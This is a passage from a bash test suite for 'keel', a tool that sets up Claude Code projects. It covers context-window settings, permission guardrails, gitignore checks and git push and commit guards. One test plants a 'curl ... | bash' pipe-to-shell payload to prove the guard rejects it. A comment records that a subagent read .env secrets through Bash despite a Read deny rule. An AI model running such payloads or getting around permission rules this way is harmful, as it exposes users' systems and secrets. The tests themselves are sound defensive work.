g=json.load(open('$ROOT/templates/profile.schema.json'))['properties']['gates']['properties']
sys.exit(0 if 'context_window' in g else 1)" \
  && ok "context_window is schema-declared, so writing it needed no bump" \
  || bad "context_window" "gates.context_window is no longer declared by the schema"

# Re-running init is how a project picks up new keel defaults, and it must not quietly downgrade a
# 1M project to a 200000 window on the way. merge_profile gives a non-empty human value precedence;
# nothing asserted it for this key.
e="$(fixture node-ts)"
( cd "$e" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$e" <<'PY2'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=1000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY2
( cd "$e" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
sys.exit(0 if json.load(open('$e/.keel/profile.json'))['gates']['context_window']==1000000 else 1)" \
  && ok "re-running init preserves a hand-set context_window" \
  || bad "context_window" "re-init overwrote a human value, downgrading a 1m project"

( cd "$e" && "$KEEL" init --force -y >/dev/null 2>&1 )
python3 -c "
import json,sys
sys.exit(0 if json.load(open('$e/.keel/profile.json'))['gates']['context_window']==200000 else 1)" \
  && ok "init --force replaces context_window, as it replaces the rest of the profile" \
  || bad "context_window" "--force left the old value"

# And the downgrade --force just performed is recoverable in flight, which is the only reason it is
# acceptable behaviour rather than a defect.
got="$(env -u KEEL_CONTEXT_WINDOW python3 -c "
import sys
sys.path.insert(0, '$ROOT/lib')
import context_watch
print(context_watch.window_for('claude-opus-5', observed=400000, configured=200000))
")"
[ "$got" = "1000000" ] && ok "a force-downgraded window is raised again by observation" \
  || bad "context_window" "got $got: --force would strand a 1m project at 200000"
rm -rf "$e"

# Four places describe how the window is decided and all four said an explicit setting simply wins.
# That stopped being true when the profile key became a floor. A description that is wrong is worse
# than none: it is read once and believed.
f="$(fixture node-ts)"
( cd "$f" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$f" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"context watchdog available (window 200000"*) ok "doctor names the configured window" ;;
  *) bad "doctor window" "did not name the configured window" ;;
esac
case "$out" in
  *raised*) ok "doctor says the configured window can be raised by observation" ;;
  *) bad "doctor window" "doctor still presents the configured window as final" ;;
esac

python3 - "$f" <<'PY2'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
del d["gates"]["context_window"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY2
out="$( cd "$f" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"window assumed 200000"*) ok "doctor still explains an unset window for older profiles" ;;
  *) bad "doctor window" "the unset branch stopped being reachable or accurate" ;;
esac
rm -rf "$f"

grep -q 'floor' templates/profile.schema.json \
  && ok "the gates.context_window description describes the floor" \
  || bad "schema doc" "the schema still describes a configured window as simply winning"

# The bound must not be silent. It exists because a mistyped window disables the watchdog without
# saying so, and a bound that clamps without saying so has moved that failure rather than fixed it.
g="$(fixture node-ts)"
( cd "$g" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$g" <<'PY3'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=200000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY3
out="$( cd "$g" && "$KEEL" doctor 2>&1 )"
case "$out" in *200000000*) ok "doctor names the configured value it bounded" ;;
  *) bad "bound report" "doctor did not name the configured 200000000" ;; esac
case "$out" in *1000000*) ok "doctor names the value actually in use" ;;
  *) bad "bound report" "doctor did not name the bounded 1000000" ;; esac

python3 - "$g" <<'PY3'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=1000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY3
out="$( cd "$g" && "$KEEL" doctor 2>&1 )"
case "$out" in *"above the largest"*) bad "bound report" "doctor warned about a legitimate 1000000" ;;
  *) ok "doctor says nothing about bounding a window at the maximum" ;; esac
rm -rf "$g"

# Doctor must report the window the watchdog will actually use, not the number in the file. The
# profile key is a floor: it raises the starting window and never lowers it, so a value at or below
# the default is discarded. Reporting it as though it were in force tells someone who lowered the
# window to get an earlier pause that it worked, when nothing changed.
h="$(fixture node-ts)"
( cd "$h" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$h" <<'PY4'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=50000
p.write_text(json.dumps(d,indent=2)+"\n")
PY4
out="$( cd "$h" && "$KEEL" doctor 2>&1 )"
case "$out" in *"window 50000 from gates"*) bad "doctor window" "doctor reports 50000 as in force; the watchdog uses 200000" ;;
  *) ok "doctor does not report a below-default window as the one in use" ;; esac
case "$out" in *200000*) ok "doctor names the window actually in force for a below-default setting" ;;
  *) bad "doctor window" "doctor did not name 200000, the window really in use" ;; esac

# And the environment override is what doctor must report when it is set, since it beats the file.
out="$( cd "$h" && KEEL_CONTEXT_WINDOW=500000 "$KEEL" doctor 2>&1 )"
case "$out" in *KEEL_CONTEXT_WINDOW*500000*|*500000*KEEL_CONTEXT_WINDOW*) ok "doctor reports the environment override when it is set" ;;
  *) bad "doctor window" "doctor ignored KEEL_CONTEXT_WINDOW while claiming it overrides" ;; esac
rm -rf "$h"

# The enabledPlugins entry stays. That is the part that is true of the project: this is the plugin
# set the repository expects, and a teammate running /plugin sees it already listed.
case "$(plugins_of "$d")" in *"keel@gbi"*) ok "init still records that the project expects keel@gbi" ;;
  *) bad "marketplace" "keel@gbi is no longer enabled: $(plugins_of "$d")" ;; esac

# Nothing in the committed file may name the private repository. The nudge names it, and should:
# an install instruction is advice a reader acts on, not a declaration a machine resolves.
grep -q 'gbi-solutions-ltd/keel' "$d/.claude/settings.json" \
  && bad "marketplace" "the committed settings.json names the private repo" \
  || ok "the committed settings.json names no private repository"
rm -rf "$d"

# ---- the plugin-less nudge hook -------------------------------------------
# Load-bearing per decision 1: with skills living in the plugin rather than the repo, this hook is
# the only thing that tells a session without the plugin that a standard exists at all.
#
# The hook cannot detect the plugin, and no rewrite of it can. CLAUDE_PLUGIN_ROOT is set only for
# hooks a plugin itself defines, pointing at that plugin's own directory; a hook registered in a
# project's settings.json never receives it. Measured in a live session: a project SessionStart hook
# sees CLAUDE_PROJECT_DIR and thirteen other CLAUDE_* variables, and not one of them names a loaded
# plugin. So the message is a conditional the reader evaluates against its own skill list, and these
# cases pin that it does not depend on the environment.

parent="$(mktemp -d)"
( cd "$parent" && "$KEEL" new svc-nudge --stack node >/dev/null 2>&1 )
d="$parent/svc-nudge"
[ -f "$d/.claude/keel-nudge" ] && ok "new writes the plugin-less nudge hook" || bad "nudge" "hook absent"

# Same output either way. Keying off CLAUDE_PLUGIN_ROOT made the hook silent under a test that set
# the variable by hand and loud in every real session, including ones with all 24 skills loaded.
with="$( cd "$d" && CLAUDE_PLUGIN_ROOT=/somewhere/keel .claude/keel-nudge 2>&1 )"
without="$( cd "$d" && env -u CLAUDE_PLUGIN_ROOT .claude/keel-nudge 2>&1 )"
{ [ -n "$without" ] && [ "$with" = "$without" ]; } && ok "the nudge does not key off CLAUDE_PLUGIN_ROOT" \
  || bad "nudge" "output depends on CLAUDE_PLUGIN_ROOT, which a project hook never receives"

# The condition has to be one the reader can check, which is its own skill list.
case "$without" in *'keel:'*) ok "nudge states a condition the reader can evaluate" ;;
  *) bad "nudge" "does not say how to tell whether the plugin is loaded: $without" ;; esac

case "$without" in *"marketplace add"*) ok "nudge names the install command" ;;
  *) bad "nudge" "said nothing useful: $without" ;; esac

# It must emit valid hook JSON, or the session start breaks rather than being nudged.
printf '%s' "$without" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null \
  && ok "nudge emits valid hook JSON" || bad "nudge" "output is not valid JSON"

# It prints in every session, so it sits in the prefix of every request of that session. Budgeted
# like the SessionStart injection beside it, estimated at chars/3.6 the same way.
n=$(printf '%s' "$without" | wc -c | tr -d ' ')
[ "$(( n * 10 / 36 ))" -le 200 ] && ok "nudge is within its 200-token budget" \
  || bad "nudge" "is about $(( n * 10 / 36 )) tokens, over the 200 ceiling"

# Registered in settings so a session actually runs it.
grep -q 'keel-nudge' "$d/.claude/settings.json" && ok "nudge is registered in settings.json" \
  || bad "nudge" "not registered as a SessionStart hook"
rm -rf "$parent"

# ---- staleness against the installed version -------------------------------
# Per-project files do not update themselves when the plugin does, so the profile has to record
# which keel wrote it. That only works if init overwrites the field, which the merge would
# otherwise refuse to do: every other value in the profile is one a human may have corrected.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

# schema_version is the tool's, like keel_version. It answers "does this profile have the fields
# the installed keel expects", which keel_version cannot, because most releases change no field.
got="$(python3 -c "import json;print(json.load(open('$d/.keel/profile.json')).get('schema_version'))")"
want="$(sed -n 's/^SCHEMA_VERSION=\([0-9][0-9]*\)$/\1/p' "$ROOT/bin/keel")"
[ -n "$want" ] && [ "$got" = "$want" ] && ok "init writes the schema_version bin/keel declares" \
  || bad "schema_version" "profile has '$got', bin/keel declares '$want'"

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["schema_version"] = 0
p.write_text(json.dumps(d, indent=2) + "\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" schema_version)"
[ "$got" = "$want" ] && ok "re-running init reclaims schema_version" \
  || bad "schema_version" "stayed '$got' after re-init, want '$want'"

out="$( cd "$d" && "$KEEL" profile set schema_version 2 2>&1 )" && rc=0 || rc=$?
case "$rc:$out" in
  1:*"written by init"*) ok "profile set refuses schema_version" ;;
  *) bad "schema_version" "profile set did not refuse: rc=$rc out=${out:0:80}" ;;
esac

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["keel_version"] = "0.0.1-old"
p.write_text(json.dumps(d, indent=2) + "\n")
PY
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *"configured by keel 0.0.1-old"*) ok "doctor reports which keel configured the project" ;;
  *) bad "staleness" "doctor did not report the configuring version" ;; esac

# The point of the split: an old keel_version alone is not staleness any more, because most
# releases change no field. Only a schema_version mismatch is.
# Matched on the staleness message's own tail, not on "Re-run 'keel init'", which doctor also emits
# for missing permission guardrails. The looser pattern passed only because init had just written
# those guardrails into this fixture, so a regression there would have failed this test and sent the
# reader to the wrong code.
case "$out" in *"to pick up the new fields"*) bad "staleness" "warned on keel_version alone, which fires on every release" ;;
  *) ok "an old keel_version alone does not raise the re-run warning" ;; esac

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); del d["schema_version"]
p.write_text(json.dumps(d, indent=2) + "\n")
PY
out2="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out2" in *"schema version none"*) ok "doctor treats an absent schema_version as stale" ;;
  *) bad "staleness" "doctor did not notice a profile with no schema_version" ;; esac

( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" keel_version)"
want="$(cat "$ROOT/VERSION")"
[ "$got" = "$want" ] && ok "re-running init refreshes the recorded version" \
  || bad "staleness" "version stayed '$got', want '$want'"

# The tool owns that one field. Everything else in the profile still belongs to the human, and
# the same re-init must not have touched it.
python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["verify"]["test"] = "npm test -- --runInBand"
p.write_text(json.dumps(d, indent=2) + "\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
case "$got" in *runInBand*) ok "refreshing the version does not disturb human values" ;;
  *) bad "staleness" "verify.test was overwritten with '$got'" ;; esac
rm -rf "$d"

# ---- permission guardrails and the permission mode -------------------------
# The design: bypassPermissions per developer in the local file, guardrails for everyone in the
# committed one. It rests on deny and ask rules still applying once prompts are off, which was
# verified against a live session. These tests pin the file shapes that carry it.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']
sys.exit(0 if p.get('deny') and p.get('ask') else 1)" 2>/dev/null \
  && ok "init writes deny and ask rules into the committed settings" \
  || bad "guardrails" "no deny/ask rules in .claude/settings.json"

# A Read deny matches the Read tool and nothing else, so `cat .env` reaches the same bytes through a
# different door. Found when a subagent running under these exact rules reported .env contents it had
# read via Bash. The Bash entries are defence in depth, not a boundary, and the comment on
# keel_deny_rules says so; this asserts they are at least present.
python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']['deny']
sys.exit(0 if any(r.startswith('Bash(') and 'env' in r for r in p) else 1)" 2>/dev/null \
  && ok "the deny list covers reading a secret through Bash, not only through Read" \
  || bad "guardrails" "only Read is denied, so cat .env is unguarded"

# The security property of the whole split. A committed bypassPermissions turns off prompts for
# everyone who clones the repository, before they have read a line of it.
grep -q 'bypassPermissions' "$d/.claude/settings.json" \
  && bad "guardrails" "bypassPermissions leaked into the committed settings.json" \
  || ok "the committed settings.json sets no permission mode"

grep -q 'bypassPermissions' "$d/.claude/settings.local.json" 2>/dev/null \
  && ok "init sets bypassPermissions in the local settings" \
  || bad "guardrails" "no defaultMode in .claude/settings.local.json"

( cd "$d" && git check-ignore -q .claude/settings.local.json ) \
  && ok "init git-ignores the local settings file" \
  || bad "guardrails" ".claude/settings.local.json is not ignored"

# A mature repo already has both files, and is exactly the case that most needs the guardrails.
# Nothing already in them may be lost.
d2="$(fixture node-ts)"
mkdir -p "$d2/.claude"
printf '{ "enabledPlugins": { "someone-elses@thing": true } }\n' > "$d2/.claude/settings.json"
printf '{ "permissions": { "allow": ["Bash(npm test:*)"] } }\n' > "$d2/.claude/settings.local.json"
( cd "$d2" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$d2/.claude/settings.json'))
l=json.load(open('$d2/.claude/settings.local.json'))
sys.exit(0 if ('someone-elses@thing' in s.get('enabledPlugins',{})
            and s['permissions']['deny']
            and 'Bash(npm test:*)' in l['permissions']['allow']
            and l['permissions']['defaultMode']=='bypassPermissions') else 1)" 2>/dev/null \
  && ok "merging guardrails preserves existing settings and allow rules" \
  || bad "guardrails" "merge lost pre-existing settings"

# Re-running must not accumulate duplicates: doctor compares against the same lists.
( cd "$d2" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
p=json.load(open('$d2/.claude/settings.json'))['permissions']
sys.exit(0 if len(p['deny'])==len(set(p['deny'])) and len(p['ask'])==len(set(p['ask'])) else 1)" 2>/dev/null \
  && ok "re-running init does not duplicate guardrails" \
  || bad "guardrails" "duplicate rules after a second init"

# doctor must notice both ways the design can be broken after the fact.
# Capture doctor's output rather than piping it: doctor exits non-zero by design when it finds a
# problem, and under `set -o pipefail` that status is what the pipeline returns, not grep's. Piping
# here silently inverts the test, which is the failure this comment exists to stop recurring.
d3="$(fixture node-ts)"
( cd "$d3" && "$KEEL" init -y >/dev/null 2>&1 )
printf '{ "permissions": { "deny": [], "ask": [] } }\n' > "$d3/.claude/settings.json"
out="$( cd "$d3" && "$KEEL" doctor 2>&1 )"
case "$out" in *"permission guardrail(s) missing"*) ok "doctor fails when the guardrails have been removed" ;;
  *) bad "guardrails" "doctor did not notice missing guardrails" ;; esac

# The global excludes file is neutralised because a developer's global gitignore may already cover
# `.claude/settings.local.json`, as this author's does. Without that, emptying the repository's
# .gitignore leaves the file still ignored, the check still passes, and the test proves nothing
# about the line keel writes. It is the repository's own .gitignore that has to protect a
# teammate who has no such global rule.
d4="$(fixture node-ts)"
( cd "$d4" && "$KEEL" init -y >/dev/null 2>&1 && : > .gitignore )
out="$( cd "$d4" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"not git-ignored"*) ok "doctor fails when the local settings file would be committed" ;;
  *) bad "guardrails" "doctor did not notice a committable settings.local.json" ;; esac

# And the positive case, isolated the same way: the line keel writes must do the job alone.
d5="$(fixture node-ts)"
( cd "$d5" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$d5" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"settings.local.json is git-ignored"*) ok "the .gitignore line keel writes ignores the file on its own" ;;
  *) bad "guardrails" "keel's own .gitignore line did not ignore the local settings file" ;; esac
rm -rf "$d5"
rm -rf "$d" "$d2" "$d3" "$d4"

# ---- the handoff stays out of git -----------------------------------------
# The same three properties as the local settings file, for the same reason: a file the tooling
# writes into a working tree gets committed by the next `git add -A` unless a rule stops it. The
# handoff is session state, stale the moment work resumes, and it has reached a commit twice.
d6="$(fixture node-ts)"
( cd "$d6" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d6" && git check-ignore -q .keel/handoff.md ) \
  && ok "init git-ignores the handoff file" \
  || bad "handoff" ".keel/handoff.md is not ignored"

# Isolated from a developer's global excludes, as above: the repository's own line has to do the job
# for a teammate who has no such global rule.
d7="$(fixture node-ts)"
( cd "$d7" && "$KEEL" init -y >/dev/null 2>&1 )
printf '# Session handoff\n' > "$d7/.keel/handoff.md"
out="$( cd "$d7" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"handoff.md is git-ignored"*) ok "the .gitignore line keel writes ignores the handoff on its own" ;;
  *) bad "handoff" "keel's own .gitignore line did not ignore the handoff" ;; esac

# A handoff already in the index is the case the ignore line cannot fix on its own, and the one that
# actually happened. git check-ignore reports a tracked path as not ignored, so doctor catches both.
d8="$(fixture node-ts)"
( cd "$d8" && "$KEEL" init -y >/dev/null 2>&1 )
printf '# Session handoff\n' > "$d8/.keel/handoff.md"
( cd "$d8" && git add -f .keel/handoff.md >/dev/null 2>&1 )
out="$( cd "$d8" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"handoff.md is not git-ignored"*) ok "doctor fails when the handoff file would be committed" ;;
  *) bad "handoff" "doctor did not notice a committable handoff" ;; esac

# A .gitignore whose last line has no newline terminator, which is what a real repository hands you.
# Found on the existing-service pilot: the append welded keel's rule onto the project's own last
# line, producing one line that matches nothing. It destroyed the rule that was already there and
# added neither of keel's. Both ignores are asserted because the concatenation consumes the first
# rule and drops the second, and either alone would miss half of it.
d9="$(fixture node-ts)"
printf 'node_modules/\n.claude/settings.local.json' > "$d9/.gitignore"   # deliberately unterminated
( cd "$d9" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d9" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null \
    git check-ignore -q .claude/settings.local.json ) \
  && ok "an unterminated .gitignore keeps the rule it already had" \
  || bad "handoff" "init corrupted the project's own last .gitignore line"
( cd "$d9" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null \
    git check-ignore -q .keel/handoff.md ) \
  && ok "an unterminated .gitignore still gets keel's own rules appended" \
  || bad "handoff" ".keel/handoff.md is not ignored after appending to an unterminated .gitignore"

# The check has to answer "would a teammate who clones this commit the file", not "is it ignored on
# this machine". A developer's global excludes answers the second question yes while the repository
# carries no rule at all, and doctor then reports ok on a repository that protects nobody else.
#
# This is not hypothetical: it is why the unterminated-.gitignore bug above survived a doctor run
# that said ok. The author's own ~/.gitignore covers settings.local.json, so destroying the
# repository's rule changed nothing doctor could see.
d10="$(fixture node-ts)"
( cd "$d10" && "$KEEL" init -y >/dev/null 2>&1 && : > .gitignore )
printf '.claude/settings.local.json\n.keel/handoff.md\n' > "$d10/global-excludes"
printf '# Session handoff\n' > "$d10/.keel/handoff.md"
out="$( cd "$d10" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile \
        GIT_CONFIG_VALUE_0="$d10/global-excludes" "$KEEL" doctor 2>&1 )"
case "$out" in *"settings.local.json is not git-ignored"*)
    ok "doctor ignores a global excludes rule when checking the local settings file" ;;
  *) bad "guardrails" "doctor accepted a global excludes rule in place of the repository's own" ;; esac
case "$out" in *"handoff.md is not git-ignored"*)
    ok "doctor ignores a global excludes rule when checking the handoff" ;;
  *) bad "handoff" "doctor accepted a global excludes rule in place of the repository's own" ;; esac
rm -rf "$d6" "$d7" "$d8" "$d9" "$d10"

# ---- invoked through a symlink on PATH ------------------------------------
# The documented install is a symlink into a directory on PATH. dirname does not follow symlinks,
# so before the fix HERE resolved to the symlink's directory: lib/ failed to source, VERSION fell
# back to 0.0.0, and templates were silently absent. It reported success while doing nothing.

parent="$(mktemp -d)"
ln -s "$KEEL" "$parent/keel"
real_version="$(cat "$(dirname "$KEEL")/../VERSION")"
[ "$("$parent/keel" version)" = "$real_version" ] \
  && ok "invoked through a symlink, keel finds its own VERSION" \
  || bad "symlink" "version through a symlink was not $real_version"

# init is the real proof: it needs lib/ and templates/, which is what a broken HERE loses.
proj="$parent/via-symlink"
mkdir -p "$proj" && ( cd "$proj" && git init -q . && "$parent/keel" init -y >/dev/null 2>&1 )
[ -s "$proj/docs/keel/prompting.md" ] \
  && ok "invoked through a symlink, init still reaches its templates" \
  || bad "symlink" "init through a symlink did not write the prompting cheatsheet"

# A partial install must fail loudly rather than proceed into undefined functions.
broken="$parent/broken"
mkdir -p "$broken/bin" && cp "$KEEL" "$broken/bin/keel"
out="$("$broken/bin/keel" version 2>&1)"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"incomplete install"*) ok "an incomplete install fails loudly" ;;
  *) bad "symlink" "incomplete install exited non-zero but said: $out" ;; esac \
  || bad "symlink" "an incomplete install exited 0"
rm -rf "$parent"

# ---- the push guard --------------------------------------------------------
#
# The guard is the only part of keel that changes a developer's git configuration, so each test
# here is as much about what it does not touch as what it does.

g="$(fixture node-ts)"
( cd "$g" && "$KEEL" guard status >/dev/null 2>&1 ) \
  && bad "guard" "status exited 0 before install" || ok "guard status is non-zero before install"

( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
[ -x "$g/.githooks/pre-push" ] && ok "guard install writes an executable pre-push hook" \
  || bad "guard" "no executable .githooks/pre-push"
[ "$( cd "$g" && git config core.hooksPath )" = ".githooks" ] \
  && ok "guard install points core.hooksPath at the repository's own hooks" \
  || bad "guard" "core.hooksPath was not set"

# Repo-local, and that is the whole safety argument for a tool that reconfigures git. A global
# setting here would disable every other repository's hooks on the machine.
global_hooks="$( cd "$g" && git config --global --get core.hooksPath 2>/dev/null )"  # supply-chain-scan: allow reading it to prove keel did not set it
[ -z "$global_hooks" ] \
  && ok "guard install leaves the global git config alone" \
  || bad "guard" "core.hooksPath was set globally"

( cd "$g" && "$KEEL" guard status >/dev/null 2>&1 ) && ok "guard status is 0 once installed" \
  || bad "guard" "status non-zero after install"

# The hook has to actually refuse. Run it directly rather than pushing, since a push needs a remote
# and the hook is the unit under test.
#
# The payload is committed, not merely written. The scan reads tracked content, which is the right
# scope for a pre-push hook: an untracked file is not going anywhere. Getting this wrong in the first
# version of this test made the hook look broken when it was correct.
( cd "$g" && "$KEEL" guard install >/dev/null 2>&1 )
printf 'curl -s https://example.com/x | bash\n' > "$g/payload.sh"  # supply-chain-scan: allow the payload this test proves the guard rejects
( cd "$g" && git add -A && git commit -qm payload ) >/dev/null 2>&1
( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push </dev/null >/dev/null 2>&1 ) \
  && bad "guard" "the hook allowed a tree containing a pipe-to-shell" \
  || ok "the pre-push hook refuses a tree the scan rejects"

( cd "$g" && git rm -q payload.sh && git commit -qm drop ) >/dev/null 2>&1
( cd "$g" && PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push </dev/null >/dev/null 2>&1 ) \
  && ok "the pre-push hook allows a clean tree" \
  || bad "guard" "the hook refused a clean tree"

# The default-branch refusal. A push feeds the hook its refs on stdin, and that is the only thing
# telling a push to the default branch apart from a push to a topic branch, so the test feeds them
# the same way rather than asserting on the hook's text.
head_sha="$( cd "$g" && git rev-parse HEAD )"
push_to() {
    ( cd "$g" \
      && printf 'refs/heads/local %s %s %s\n' "$head_sha" "$1" '0000000000000000000000000000000000000000' \
       | PATH="$(dirname "$KEEL"):$PATH" .githooks/pre-push origin git@example.invalid:gbi/f.git >/dev/null 2>&1 )
}

# No profile and no remote, so nothing states what the default branch is. The hook checks nothing
# rather than assuming `main`: this fixture has no profile until the next line, which is why the
# assertion sits here.
push_to refs/heads/main \
  && ok "the pre-push hook does not guess a default branch with no profile" \
  || bad "guard" "the hook refused on an assumed branch name"

( cd "$g" && "$KEEL" init -y >/dev/null 2>&1 )
push_to refs/heads/main \
  && bad "guard" "the hook allowed a push straight to the default branch" \
  || ok "the pre-push hook refuses a push to the default branch"

push_to refs/heads/feat-x \
  && ok "the pre-push hook allows a push to a topic branch" \
  || bad "guard" "the hook refused a push to a topic branch"

# The branch comes from the profile, so a repo whose default is not `main` is protected on its own
# name. Asserting both directions is the point: protecting `trunk` while still refusing `main`
# would pass a one-sided test and protect nothing here.
python3 - "$g" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["conventions"]["default_branch"]="trunk"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
push_to refs/heads/trunk \
  && bad "guard" "the hook ignored default_branch from the profile" \
  || ok "the pre-push hook protects the branch named in the profile, not 'main'"
push_to refs/heads/main \
  && ok "the pre-push hook allows 'main' when the profile says the default is elsewhere" \
  || bad "guard" "the hook refused a branch that is not the profile's default"

# The escape hatch a project that genuinely pushes to its default branch needs.
python3 - "$g" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["conventions"]["default_branch"]="main"
d["conventions"]["protect_default_branch"]=False
p.write_text(json.dumps(d,indent=2)+"\n")
PY
push_to refs/heads/main \
  && ok "protect_default_branch false allows the push" \
  || bad "guard" "the hook refused with protect_default_branch false"

# The hook body lives inside a quoted heredoc, so the repo's own lint reads it as a string and never
# parses it. Linting the generated file is the only way that code gets checked at all.
if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$g/.githooks/pre-push" >/dev/null 2>&1 \
      && ok "the generated pre-push hook is shellcheck clean" \
      || bad "guard" "shellcheck flagged the generated hook: $(shellcheck -s bash "$g/.githooks/pre-push" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated hook was not linted\n'
fi

( cd "$g" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ -z "$( cd "$g" && git config core.hooksPath 2>/dev/null )" ] \
  && ok "guard uninstall clears core.hooksPath" || bad "guard" "core.hooksPath survived uninstall"
rm -rf "$g"

# ---- the commit guard ------------------------------------------------------
#
# One install writes two hooks, and the second one is inert until the profile asks for it. That
# split is the design: a team installs the guard for the push protections, and a commit gate that
# arrived uninvited alongside them is how a tool gets uninstalled.

c="$(fixture node-ts)"
( cd "$c" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$c" && "$KEEL" guard install >/dev/null 2>&1 )

[ -x "$c/.githooks/pre-commit" ] && ok "guard install writes an executable pre-commit hook" \
  || bad "commit guard" "no executable .githooks/pre-commit"

gate_of() { python3 -c "import json;print(json.load(open('$1/.keel/profile.json'))['gates'].get('commit_guard'))" 2>/dev/null; }
[ "$(gate_of "$c")" = "off" ] && ok "init writes gates.commit_guard off by default" \
  || bad "commit guard" "gates.commit_guard is '$(gate_of "$c")', want 'off'"

# Off is off, and this fixture proves it rather than asserting it: its lint is `eslint .`, which is
# not installed here, so a hook that read the gate wrongly would fail on this line.
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && ok "the pre-commit hook is inert while gates.commit_guard is off" \
  || bad "commit guard" "the hook ran its checks with the gate off"

# The remedy the refusal has to name. Set before the gate so the first refusal already carries it.
( cd "$c" && "$KEEL" profile set verify.format 'test 1 = 2' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set verify.format_fix 'npm run format' >/dev/null 2>&1 )
( cd "$c" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )

( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 ) \
  && bad "commit guard" "the hook allowed a commit past a failing verify command" \
  || ok "the pre-commit hook refuses when a verify command fails"

out="$( cd "$c" && .githooks/pre-commit 2>&1 )"
case "$out" in *"npm run format"*) ok "the refusal names verify.format_fix as the remedy" ;;
  *) bad "commit guard" "the refusal did not name format_fix" ;; esac
case "$out" in *"--no-verify"*) ok "the refusal names the escape hatch" ;;
  *) bad "commit guard" "the refusal did not name --no-verify" ;; esac

# It checks and never rewrites. A hook that reformatted the tree would put content into a commit
# its author never read, which is the reason this gate refuses instead of fixing.
before="$( cd "$c" && git status --porcelain )"
( cd "$c" && .githooks/pre-commit >/dev/null 2>&1 )
[ "$( cd "$c" && git status --porcelain )" = "$before" ] \
  && ok "the refusing hook leaves the working tree alone" \
  || bad "commit guard" "the hook modified the tree"

